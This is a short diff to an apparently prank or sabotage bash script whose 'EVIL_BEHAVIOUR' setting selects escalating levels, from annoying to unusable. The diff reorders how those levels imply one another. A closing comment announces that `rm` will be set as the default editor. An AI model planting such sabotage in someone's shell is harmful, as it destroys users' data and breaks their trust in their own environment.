@@ -15,27 +15,27 @@ EVIL_BEHAVIOUR=annoying
 
 function insane()
 {
-	test "$EVIL_BEHAVIOUR" = "insane"
+	annoying || test "$EVIL_BEHAVIOUR" = "insane"
 }
 
 function annoying()
 {
-	insane || test "$EVIL_BEHAVIOUR" = "annoying"
+	destructive || test "$EVIL_BEHAVIOUR" = "annoying"
 }
 
 function destructive()
 {
-	annoying || test "$EVIL_BEHAVIOUR" = "destructive"
+	devasting || test "$EVIL_BEHAVIOUR" = "destructive"
 }
 
 function devasting()
 {
-	destructive || test "$EVIL_BEHAVIOUR" = "devasting"
+	unusable || test "$EVIL_BEHAVIOUR" = "devasting"
 }
 
 function unusable()
 {
-	devasting || test "$EVIL_BEHAVIOUR" = "unusable"
+	test "$EVIL_BEHAVIOUR" = "unusable"
 }
 
 # Set `rm` as the default editor.
